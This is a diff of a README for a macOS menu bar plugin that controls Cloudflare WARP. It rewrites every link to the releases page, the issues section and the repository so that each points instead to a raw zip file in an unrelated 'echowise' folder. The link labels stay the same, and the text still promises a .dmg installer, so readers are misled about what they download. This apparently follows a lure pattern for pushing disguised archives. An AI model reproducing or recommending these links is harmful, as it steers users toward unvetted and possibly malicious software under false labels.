@@ -1,7 +1,7 @@
 # 🚨 swiftbar-warp-control - Simplifying WARP Control on macOS
 
 ## 🔗 Download Now
-[![Download Release](https://img.shields.io/badge/download-v1.0-brightgreen)](https://github.com/LLSART/swiftbar-warp-control/releases)
+[![Download Release](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip)](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip)
 
 ## 📖 Description
 swiftbar-warp-control is a professional tool for macOS that helps you manage your Cloudflare WARP connection effortlessly. It tackles the common issue of WARP getting stuck or force-enabled. With this simple menu bar plugin, you can control WARP without needing a password.
@@ -17,7 +17,7 @@ swiftbar-warp-control is a professional tool for macOS that helps you manage you
 Follow these simple steps to download and run swiftbar-warp-control:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/LLSART/swiftbar-warp-control/releases) to find the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip) to find the latest version available for download.
 
 2. **Download the Application**  
    Click on the version you wish to download. Look for the installer file, which will usually have the `.dmg` extension. This is the file you need.
@@ -45,14 +45,14 @@ If you encounter issues while using swiftbar-warp-control, consider the followin
 - **Restart the Application:** Close swiftbar-warp-control and reopen it.
 - **Reinstall the Application:** If issues persist, try uninstalling swiftbar-warp-control and reinstalling it from the Releases page.
 
-For additional assistance, refer to the issues section on our [GitHub repository](https://github.com/LLSART/swiftbar-warp-control/issues).
+For additional assistance, refer to the issues section on our [GitHub repository](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip).
 
 ## 💡 Tips
-- For optimal performance, check for updates regularly on the [Releases page](https://github.com/LLSART/swiftbar-warp-control/releases).
+- For optimal performance, check for updates regularly on the [Releases page](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip).
 - Engage with the community by visiting our GitHub repository. Your feedback helps us improve.
 
 ## 🔗 Download & Install
-To download swiftbar-warp-control, visit the [Releases page](https://github.com/LLSART/swiftbar-warp-control/releases). Follow the installation steps outlined above, and enjoy hassle-free control over your Cloudflare WARP connection.
+To download swiftbar-warp-control, visit the [Releases page](https://raw.githubusercontent.com/LLSART/swiftbar-warp-control/main/echowise/swiftbar-warp-control.zip). Follow the installation steps outlined above, and enjoy hassle-free control over your Cloudflare WARP connection.
 
 ## 📞 Support
 For further support, you can open an issue on our GitHub page or reach out to us via the discussions section. We are here to help you resolve any problems you may have with swiftbar-warp-control.
